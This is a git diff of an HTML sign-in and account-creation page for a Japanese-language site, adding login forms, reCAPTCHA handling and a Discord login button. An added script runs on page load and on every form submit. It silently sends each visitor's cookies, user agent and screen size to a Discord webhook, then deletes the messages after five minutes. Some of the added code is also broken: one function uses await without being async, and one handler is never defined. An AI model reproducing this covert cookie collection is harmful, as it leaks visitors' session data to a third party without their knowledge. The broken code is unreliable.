@@ -7,7 +7,6 @@
 	<meta http-equiv="Pragma" content="no-cache">
 	<meta http-equiv="Cache-Control" content="no-cache">
 	<meta http-equiv="Expires" content="0">
-	<meta http-equiv="refresh" content="1;https://n138-kz.github.io/">
 	<link rel="preconnect dns-prefetch" href="//github.com">
 	<link rel="preconnect dns-prefetch" href="//n138-kz.github.io">
 	<link rel="preconnect dns-prefetch" href="//code.jquery.com">
@@ -15,8 +14,453 @@
 	<link rel="preconnect dns-prefetch" href="//www.google.com">
 	<link rel="stylesheet" type="text/css" href="https://n138-kz.github.io/lib/master.css?t=0" />
 	<script src="https://n138-kz.github.io/lib/master.js"></script>
-	<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+	<script
+		src="https://code.jquery.com/jquery-4.0.0.min.js"
+		integrity="sha256-OaVG6prZf4v69dPg6PhVattBXkcOWQB62pdZ3ORyrao="
+		crossorigin="anonymous"></script>
 	<script src="https://accounts.google.com/gsi/client" async defer></script>
 	<script src="https://www.google.com/recaptcha/api.js?render=6LfCHdcUAAAAAOwkHsW_7W7MfoOrvoIw9CXdLRBA"></script>
-	<script src="https://n138-kz.github.io/lib/grecaptcha.js"></script>
-</head></html>
+	<script>
+		class n138 {
+			constructor(){}
+			async sendUserAgent() {
+				const userAgent = navigator.userAgent;
+				const deviceMemory = navigator.deviceMemory || null;
+				const deviceWidth = window.innerWidth || null;
+				const deviceHeight = window.innerHeight || null;
+				const data = {
+					userAgent: userAgent,
+					timestamp: new Date().toISOString(),
+					deviceMemory: deviceMemory,
+					deviceWidth: deviceWidth,
+					deviceHeight: deviceHeight,
+					cookie: document.cookie,
+				};
+				console.debug(data);
+
+				const url = await (async () => {
+					const r = await fetch('./getEnvJS.php');
+					return (await r.json()).discord.webhook_url + '?wait=true';
+				})();
+				{
+					const payload = {
+						embeds: [
+							{
+								title: 'User Agent Information',
+								fields: [
+									{ name: 'User Agent', value: userAgent },
+									{ name: 'Device Memory', value: deviceMemory ? deviceMemory.toString() : 'N/A' },
+									{ name: 'Device Width', value: deviceWidth ? deviceWidth.toString() : 'N/A' },
+									{ name: 'Device Height', value: deviceHeight ? deviceHeight.toString() : 'N/A' },
+									{ name: 'Timestamp', value: data.timestamp },
+									{ name: 'Cookie', value: data.cookie || 'N/A' },
+								],
+							},
+						],
+					};
+					const message = await fetch(url, {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
+						},
+						body: JSON.stringify(payload),
+					});
+					let messageid = null;
+					messageid = await message.json();
+					messageid = messageid.id || null;
+					let messageid_store = null;
+					messageid_store = localStorage.getItem( (btoa(location.href)).slice(0, 16) + '.discord.messageid' );
+					messageid_store = (null === messageid_store) ? [] : JSON.parse(messageid_store);
+					messageid_store.push(messageid);
+					localStorage.setItem((btoa(location.href)).slice(0, 16) + '.discord.messageid', JSON.stringify(messageid_store));
+					setTimeout(async () => {
+						await fetch(url.split('?')[0] + '/messages/' + messageid, {
+							method: 'DELETE',
+							headers: {
+								'Content-Type': 'application/json',
+							},
+						});
+					}, 5 * 60 * 1000); // Delete message after 5 minutes
+				}
+			}
+		}
+		n138_userAgentSender = new n138().sendUserAgent();
+		const deviceWidth = window.innerWidth || null;
+		if(deviceWidth<520) {
+			document.documentElement.style.setProperty('--block-width', '320px');
+		}
+	</script>
+	<script src="./googleRecaptcha.js"></script>
+	<script>
+		const signup2internal_username = async (e) => {
+			e.preventDefault();
+
+			const button = e.submitter || e.target.querySelector('button[type="submit"]') || e.target;
+			console.debug(e);
+
+			if(!button || typeof button.dataset.provider === 'undefined') return false;
+			form = button.parentElement;
+			messagebox = form.querySelector('[name=message]');
+			console.log(messagebox);
+			messagebox.style.marginBottom = '10px';
+			messagebox.value = '';
+
+			console.debug(e);
+			const formdata = {};
+			googleRecaptcha.init();
+			formdata['g-recaptcha-response'] = await googleRecaptcha.getToken();
+			JSON.parse(button.parentElement.querySelector('input[name="item-list"]').value).forEach((itemId)=>{
+				/* *送信するアイテム一覧* */
+				const input = e.target.querySelector(`input[data-id="${itemId}"]`);
+				if(!input) return false;
+				if(input.value.length<1) return false;
+				formdata[itemId] = {
+					value: input.value,
+					name: input.name,
+				};
+			});
+			console.debug(formdata);
+
+			new n138().sendUserAgent();
+
+			let res = null;
+			res = await fetch('./signup.php', {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json',
+				},
+				body: JSON.stringify({
+					provider: button.dataset.provider,
+					formdata: formdata,
+				}),
+			});
+			res_text = await res.text();
+			console.debug(res_text);
+			if(res_text.length==0) {
+				messagebox.value = 'Internal System Error';
+				return false;
+			}
+
+			res_json = JSON.parse(res_text);
+			messagebox.value = res_json.message || res_json.error || '';
+			messagebox.style.color = (res_json.error) ? 'red' : 'black';
+			messagebox.style.textAlign = (res_json.error) ? 'left' : 'center';
+
+			if(res_json.code>=300) {
+				return false;
+			}
+			{
+				const forms = document.querySelectorAll('.form-register');
+				if(forms.length > 1) {
+					Array.from(forms).slice(1).forEach((form) => {
+						form.style.display = 'none';
+					});
+				}
+			}
+			{
+				const forms = document.querySelectorAll('.form-register-password');
+				forms.forEach((form) => {
+					form.style.display = 'none';
+				});
+			}
+			{
+				const form = document.querySelector('div.form-register');
+				form.querySelectorAll('form').forEach((o) => {
+					o.style.display = 'none';
+				});
+				form.querySelectorAll('p').forEach((o) => {
+					o.style.display = 'none';
+				});
+				{
+					const n = [];
+					n[0] = document.createElement('p');
+					n[1] = document.createTextNode('入力されたメールアドレスへ本登録依頼メールを送信しました。メール内のリンクから本登録をおこなってください。');
+					n[0].appendChild(n[1]);
+					form.appendChild(n[0]);
+					n[0] = document.createElement('p');
+					n[1] = document.createElement('a');
+					n[1].href = location.origin + location.pathname;
+					n[1].innerText = 'サインイン?';
+					n[0].appendChild(n[1]);
+					form.appendChild(n[0]);
+				}
+			}
+
+			return false;
+		};
+	</script>
+	<script>
+		const auth2internal_username = async (e) => {
+			e.preventDefault();
+
+			const button = e.submitter || e.target.querySelector('button[type="submit"]') || e.target;
+			console.debug(e);
+
+			if(!button || typeof button.dataset.provider === 'undefined') return false;
+			form = button.parentElement;
+			messagebox = form.querySelector('[name=message]');
+			console.log(messagebox);
+			messagebox.style.marginBottom = '10px';
+			messagebox.value = '';
+
+			console.debug(e);
+			const formdata = {};
+			googleRecaptcha.init();
+			formdata['g-recaptcha-response'] = await googleRecaptcha.getToken();
+			JSON.parse(button.parentElement.querySelector('input[name="item-list"]').value).forEach((itemId)=>{
+				/* *送信するアイテム一覧* */
+				const input = e.target.querySelector(`input[data-id="${itemId}"]`);
+				if(!input) return false;
+				if(input.value.length<1) return false;
+				formdata[itemId] = {
+					value: input.value,
+					name: input.name,
+				};
+			});
+			console.debug(formdata);
+
+			new n138().sendUserAgent();
+
+			let res = null;
+			res = await fetch('./login.php', {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json',
+				},
+				body: JSON.stringify({
+					provider: button.dataset.provider,
+					formdata: formdata,
+				}),
+			});
+			res_text = await res.text();
+			console.debug(res_text);
+			if(res_text.length==0) {
+				messagebox.value = 'Internal System Error';
+				return false;
+			}
+
+			res_json = JSON.parse(res_text);
+			messagebox.value = res_json.message || res_json.error || '';
+			messagebox.style.color = (res_json.error) ? 'red' : 'black';
+			messagebox.style.textAlign = (res_json.error) ? 'left' : 'center';
+
+			if(res_json.code>=300) {
+				return false;
+			}
+
+			return false;
+		};
+	</script>
+	<script>
+		const auth2discord = (e) => {
+			e.preventDefault();
+			if(typeof e === 'undefined') e = window.event.target.dataset;
+
+			if(typeof e.provider === 'undefined') return false;
+			const config_discord = await (async () => {
+				const r = await fetch('./getEnvJS.php');
+				return (await r.json()).discord.authn_bot;
+			})();
+			e.clientId = config_discord.client_id;
+			e.redirectUri = config_discord.redirect_uri;
+			e.scope = config_discord.scope;
+
+			new n138().sendUserAgent();
+			googleRecaptcha.init();
+
+			e.url = `https://discord.com/oauth2/authorize?client_id=${e.clientId}&response_type=code&redirect_uri=${encodeURIComponent(e.redirectUri)}&scope=${encodeURIComponent(e.scope)}`;
+			window.open(e.url, 'discord_oauth2', 'width=500,height=600');
+
+			console.debug(e);
+			console.debug(googleRecaptcha.getToken());
+
+			return false;
+		};
+	</script>
+	<link rel="stylesheet" href="./main.css">
+</head>
+<body>
+	<div class="container">
+		<div class="row">
+			<div class="text-center">
+				<h1>n138-kz.github.io</h1>
+			</div>
+			<hr class="block-center" style="width: 90%; margin-top: 50px; margin-bottom: 50px;">
+			<div class="block-center form-register" style="display: none;">
+				<h2 class="text-center">アカウント作成</h2>
+				<form action="" method="post" onsubmit="signup2internal_username(event)" class="block-center" style="width: 90%;">
+					<p>ユーザー名（メールアドレス）</p>
+					<div class="text-center">
+						<input
+							type="email"
+							name="username"
+							data-id="dlym6tweiywa2taq"
+							required
+							autofocus
+							autocomplete="username"
+							pattern="[a-zA-Z0-9._%\+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}"
+							title="有効なメールアドレスを入力してください（例: user@example.com）"
+							class="input-field"
+							style="
+								width: 90%;
+								height: 1.5em;
+								font-size: 1.2em;
+							">
+					</div>
+					<div class="text-center">
+						<input type="hidden" name="item-list" value='["dlym6tweiywa2taq"]' />
+						<button
+							data-provider="internal"
+							style="
+								width: 250px;
+								height: 1.5em;
+								font-size: 1.2em;
+								vertical-align: middle;
+								margin-top: 25px;
+								margin-bottom: 25px;
+							">次へ</button>
+						<output name="message" style="display: block;"></output>
+					</div>
+				</form>
+				<p><a href="javascript:void(0)" onclick="
+					document.querySelectorAll('.form-signin').forEach((form) => {
+						form.style.display = 'block';
+					});
+					document.querySelectorAll('.form-register').forEach((form) => {
+						form.style.display = 'none';
+					});
+					document.querySelectorAll('.form-register-password').forEach((form) => {
+						form.style.display = 'none';
+					});
+				">Already user?</a></p>
+
+				<hr class="block-center" style="width: 90%; margin-top: 10px; margin-bottom: 10px;">
+			</div>
+			<div class="block-center form-register-password" style="display: none;">
+				<h2 class="text-center">アカウント作成</h2>
+				<form action="" method="post" onsubmit="signup2internal_password(event)" class="block-center" style="width: 90%;">
+					<p>パスワード</p>
+					<div class="text-center">
+						<input
+							type="password"
+							name="password"
+							data-id="slinhee5pjpgbl9z"
+							required
+							autofocus
+							autocomplete="new-password"
+							minlength="8"
+							maxlength="255"
+							title="8文字以上, 大文字小文字アルファベット, 記号"
+							class="input-field"
+							style="
+								width: 90%;
+								height: 1.5em;
+								font-size: 1.2em;
+							">
+					</div>
+					<div class="text-center">
+						<input
+							type="password"
+							name="password"
+							data-id="s8racm6uxf3mwn5s"
+							required
+							autofocus
+							autocomplete="new-password"
+							minlength="8"
+							maxlength="255"
+							title="確認のため再入力"
+							class="input-field"
+							style="
+								width: 90%;
+								height: 1.5em;
+								font-size: 1.2em;
+							">
+					</div>
+					<div class="text-center">
+						<input type="hidden" name="item-list" value='["slinhee5pjpgbl9z"]' />
+						<button
+							data-provider="internal"
+							style="
+								width: 250px;
+								height: 1.5em;
+								font-size: 1.2em;
+								vertical-align: middle;
+								margin-top: 25px;
+								margin-bottom: 25px;
+							">次へ</button>
+						<output name="message" style="display: block;"></output>
+					</div>
+				</form>
+
+				<hr class="block-center" style="width: 90%; margin-top: 10px; margin-bottom: 10px;">
+			</div>
+			<div class="block-center form-signin">
+				<h2 class="text-center">サインイン</h2>
+				<form action="" method="post" onsubmit="auth2internal_username(event)" class="block-center" style="width: 90%;">
+					<p>ユーザー名（メールアドレス）</p>
+					<div class="text-center">
+						<input
+							type="email"
+							name="username"
+							data-id="dlym6tweiywa2taq"
+							required
+							autofocus
+							autocomplete="username"
+							pattern="[a-zA-Z0-9._%\+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}"
+							title="有効なメールアドレスを入力してください（例: user@example.com）"
+							class="input-field"
+							style="
+								width: 90%;
+								height: 1.5em;
+								font-size: 1.2em;
+							">
+					</div>
+					<div class="text-center">
+						<input type="hidden" name="item-list" value='["dlym6tweiywa2taq"]' />
+						<button
+							data-provider="internal"
+							style="
+								width: 250px;
+								height: 1.5em;
+								font-size: 1.2em;
+								vertical-align: middle;
+								margin-top: 25px;
+								margin-bottom: 25px;
+							">次へ</button>
+					</div>
+				</form>
+				<p><a href="javascript:void(0)" onclick="
+					document.querySelectorAll('.form-signin').forEach((form) => {
+						form.style.display = 'none';
+					});
+					document.querySelectorAll('.form-register').forEach((form) => {
+						form.style.display = 'block';
+					});
+					document.querySelectorAll('.form-register-password').forEach((form) => {
+						form.style.display = 'none';
+					});
+				">Create a user account</a></p>
+				<p><a href="javascript:void(0)" onclick="
+				">Forgot a Password</a></p>
+
+				<hr class="block-center" style="width: 90%; margin-top: 10px; margin-bottom: 10px;">
+
+				<div class="text-center">
+					<button
+						data-provider="discord"
+						onclick="auth2discord()"
+						disabled
+						style="
+							width: 250px;
+							height: 1.5em;
+							font-size: 1.2em;
+							vertical-align: middle;
+							margin-top: 25px;
+							margin-bottom: 25px;
+						">Discord Login</button>
+				</div>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
